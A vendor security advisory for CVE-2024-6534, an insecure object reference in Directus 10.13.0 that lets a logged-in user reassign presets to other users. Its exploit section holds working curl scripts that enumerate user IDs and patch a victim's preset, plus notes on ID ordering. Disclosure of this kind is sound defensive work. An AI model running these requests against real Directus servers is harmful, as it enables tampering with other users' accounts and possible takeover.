[Contact us](/contact-us/)SearchEnglishEnglishEspaÃ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# Directus 10.13.0 - IDOR

## Summary

|  |  |
| --- | --- |
| **Name** | Directus 10.13.0 - Insecure object reference via PATCH presets |
| **Code name** | [Capaldi](https://es.wikipedia.org/wiki/Lewis_Capaldi) |
| **Product** | Directus |
| **Affected versions** | 10.13.0 |
|
| **State** | Public |
|

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | Insecure object reference - Personal information |
| **Rule** | [286. Insecure object reference - Personal information](https://docs.fluidattacks.com/criteria/vulnerabilities/286) |
| **Remote** | Yes |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:L/A:N/E:H/RL:U/RC:C |
| **CVSSv3.1 Base Score** | 4.1 |
| **Exploit available** | yes |
| **CVE ID(s)** | [CVE-2024-6534](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6534) |

## Description

Directus v10.13.0 allows an authenticated external attacker to modify presets
created by the same user to assign them to another user. This is possible
because the application only validates the user parameter in the
`POST /presets` request but not in the PATCH request. When chained with
CVE-2024-6533, it could result in account takeover.

## Vulnerability

This vulnerability occurs because the application only validates the user
parameter in the `POST /presets` request but not in the PATCH request.

### Exploit

To exploit this vulnerability, we need to do the follow steps using a
non-administrative, default role attacker account.

1. Create a preset for a collection.

   Store the preset id, or use it if it already exists from `GET /presets`.
   The following example will use the `direct_users` preset.

   ```
   TARGET_HOST="http://localhost:8055"
   ATTACKER_EMAIL="malicious@malicious.com"
   ATTACKER_PASSWORD="123456"
   root_dir=$(dirname $0)
   mkdir "${root_dir}/static"

   curl -s -k -o /dev/null -w "%{http_code}" -X 'POST' "${TARGET_HOST}/auth/login" \
    -c "${root_dir}/static/attacker_directus_session_token" \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"${ATTACKER_EMAIL}\",\"password\":\"${ATTACKER_PASSWORD}\",\"mode\":\"session\"}"

   attacker_user_id=$(curl -s -k "${TARGET_HOST}/users/me" \
    -b "${root_dir}/static/attacker_directus_session_token" | jq -r ".data.id")

   # Store all user's id
   curl -s -k "${TARGET_HOST}/users" \
    -b "${root_dir}/static/attacker_directus_session_token" |
    jq -r ".data[] | select(.id != \"${attacker_user_id}\")" > "${root_dir}/static/users.json"

   # Choose the victim user id from the previous request
   victim_user_id="4f079119-2478-48c4-bd3a-30fa80c5f265"
   users_preset_id=$(curl -s -k -X 'POST' "${TARGET_HOST}/presets" \
   -H 'Content-Type: application/json' \
   -b "${root_dir}/static/attacker_directus_session_token" \
   --data-binary "{\"layout\":\"cards\",\"bookmark\":null,\"role\":null,\"user\":\"${attacker_user_id}\",\"search\":null,\"filter\":null,\"layout_query\":{\"cards\":{\"sort\":[\"email\"]}},\"layout_options\":{\"cards\":{\"icon\":\"account_circle\",\"title\":\"{{tittle}}\",\"subtitle\":\"{{ email }}\",\"size\":4}},\"refresh_interval\":null,\"icon\":\"bookmark\",\"color\":null,\"collection\":\"directus_users\"}"  | jq -r '.data.id')

   ```
2. Modify the presets via `PATCH /presets/{id}`.

   With the malicious configuration and the user ID to which you will assign
   the preset configuration. The user ID can be obtained from `GET /users`.
   The following example modifies the title parameter.

   ```
   curl -i -s -k -X 'PATCH' "${TARGET_HOST}/presets/${users_preset_id}" \
       -H 'Content-Type: application/json' \
       -b "${root_dir}/static/attacker_directus_session_token" \
       --data-binary "{\"layout\":\"cards\",\"bookmark\":null,\"role\":null,\"user\":\"${victim_user_id}\",\"search\":null,\"filter\":null,\"layout_query\":{\"cards\":{\"sort\":[\"email\"]}},\"layout_options\":{\"cards\":{\"icon\":\"account_circle\",\"title\":\"PoC Assign another users presets\",\"subtitle\":\"fakeemail@fake.com\",\"size\":4}},\"refresh_interval\":null,\"icon\":\"bookmark\",\"color\":null,\"collection\":\"directus_users\"}"

   ```

   Notes:

   Each new preset to a specific collection will have an integer consecutive
   `id` independent of the user who created it.

   The `user` is the user `id` of the victim. The server will not validate that
   we assign a new user to a preset we own.

   The app will use the first `id` preset with the lowest value it finds for a
   specific user and collection. If we control a preset with an `id` lower than
   the current preset `id` to the same collection of the victim user, we can
   attack that victim user, or if the victim has not yet defined a preset for
   that collection, then the preset `id` could be any value we control.
   Otherwise, the attacker user must have permission to modify or create the
   victim presets.

   When the victim visits the views of the modified presets, it will be
   rendered with the new configuration applied.

## Evidence of exploitation

![vulnerability-code-directus](https://res.cloudinary.com/fluid-attacks/image/upload/v1720203072/airs/advisories/directusidor/vulnerability-code-directus.png)

![vulnerability-directus](https://res.cloudinary.com/fluid-attacks/image/upload/v1720203073/airs/advisories/directusidor/vulnerability-directus.png)

![exploit-success-directus](https://res.cloudinary.com/fluid-attacks/image/upload/v1720203072/airs/advisories/directusidor/exploit-success-directus.png)

## Our security policy

We have reserved the ID CVE-2024-6534 to refer to this issue from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: Directus 10.13.0
* Operating System: Any

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by
[Miguel GÃ³mez](https://www.linkedin.com/in/conmagor)
from Fluid Attacks' Offensive Team.

## References

**Vendor page** <https://directus.io/>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-07-04

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-07-15

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-07-16

Vendor replied acknowledging the report.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2024-08-14

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)

